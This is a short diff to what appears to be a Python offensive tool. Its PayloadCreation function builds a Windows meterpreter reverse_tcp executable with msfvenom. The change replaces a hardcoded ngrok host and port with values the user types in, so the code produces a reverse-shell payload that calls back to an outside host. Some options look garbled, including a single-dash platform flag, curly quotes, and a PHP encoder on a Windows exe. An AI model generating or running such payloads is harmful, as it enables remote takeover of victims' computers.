@@ -95,7 +95,7 @@ def PayloadCreation():
     ip = input("Enter LHOST ip: ")
     port = input("\nEnter PORT: ")	
     print("\nCreating payload...")	
-    os.system('msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io LPORT=15342 -b “\\x00” -e php/base64  -f exe -o payload.exe'.format(ip, port))	
+    os.system('msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -b “\\x00” -e php/base64  -f exe -o payload.exe'.format(ip, port))	
     sleep(5)	
     os.system("clear")	
     banner()	
